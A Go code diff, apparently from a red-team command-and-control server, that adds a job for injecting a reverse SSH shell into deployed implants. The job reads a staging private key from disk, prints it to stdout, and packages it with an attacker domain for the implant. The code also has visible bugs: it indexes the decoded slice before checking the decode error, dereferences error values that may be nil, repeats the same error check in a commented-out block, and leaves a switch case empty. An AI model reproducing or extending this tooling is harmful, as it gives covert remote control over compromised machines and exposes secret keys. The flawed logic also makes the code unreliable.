@@ -56,6 +56,13 @@ type InjectEmpire struct {
     Staging string   `json:"staging"`
 }
 
+
+type InjectRevSshShellBichito struct {
+    Domain string   `json:"domain"`
+    Sshkey string   `json:"sshkey"`
+}
+
+
 // Drop Implant to Droplet
 type DropImplant struct {
 	Implant string   `json:"implant"`
@@ -462,6 +469,8 @@ func jobProcessor(jobO *Job){
 							setJobResultDB(jid,"Staging Add(MSFT Incorrect Param. Formatting)")
 							return
     					}
+    				case "ssh_rev_shell":
+
 
 					default:
 						setJobStatusDB(jid,"Error")
@@ -578,6 +587,7 @@ func jobProcessor(jobO *Job){
 					setJobResultDB(jid,"Hive-dropImplant(Drop Implant: "+stagingO.DomainName+":"+droplet.HttpsPort+"/"+droplet.Path+"/"+commandO.Filename+" created)")
 					return
 				}
+
 			case "createReport":
 
     			jsconcommanA := make([]Report, 0)
@@ -932,6 +942,80 @@ func jobProcessor(jobO *Job){
     			}
 
 				jobO.Parameters = launcher
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+				return
+
+			case "injectRevSshShell":
+
+				//Get staging
+				//from staging: type,port,domain
+    			jsconcommanA := make([]InjectEmpire, 0)
+    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
+    			errD := decoder.Decode(&jsconcommanA)
+    			commandO := jsconcommanA[0]
+    			// Error Log
+    			if errD != nil {
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
+					return
+    			}
+
+    			domain,err1,err2 := getDomainbyStagingDB(commandO.Staging)
+    			if (err1 != nil) || (err2 != nil) {
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectRevSshShell(Get Staging Domain):"+err1.Error()+err2.Error())
+					return
+    			}
+
+    			/*
+    			vpsId,err3 := getStagingVpsIdbyNameDB(commandO.Staging)
+    			if err3 != nil {
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectRevSshShell(Get Staging vpsId):"+err3.Error())
+        			return
+    			}
+
+
+    			vpsName,err4 := getVpsNamebyIdDB(vpsId)
+    			if err3 != nil {
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectRevSshShell(Get Staging vpsName):"+err4.Error())
+        			return
+    			}
+
+    			sshkey,err5 := getVpsPemDB(vpsName)
+    			if err3 != nil {
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectRevSshShell(Get Staging SSH Key):"+err5.Error())
+        			return
+    			}
+    			*/
+
+    			///usr/local/STHive/stagings/%s/implantkey
+
+    			sshkey, err := ioutil.ReadFile("/usr/local/STHive/stagings/"+commandO.Staging+"/implantkey")
+    			if err != nil {
+        			//ErrorLog
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectRevSshShell(Reading Anonymous Staging Key):"+err1.Error()+err2.Error())
+        			return
+    			}
+
+    			//Debug
+    			fmt.Println("ImplantKey: "+string(sshkey) + "Domain: "+domain)
+
+    			//JSON Encode function params 
+    			revssshellhparams := InjectRevSshShellBichito{domain,string(sshkey)}
+				bufBP := new(bytes.Buffer)
+				json.NewEncoder(bufBP).Encode(revssshellhparams)
+				resultBP := bufBP.String()
+
+				jobO.Parameters = resultBP
+				
+
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
     			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
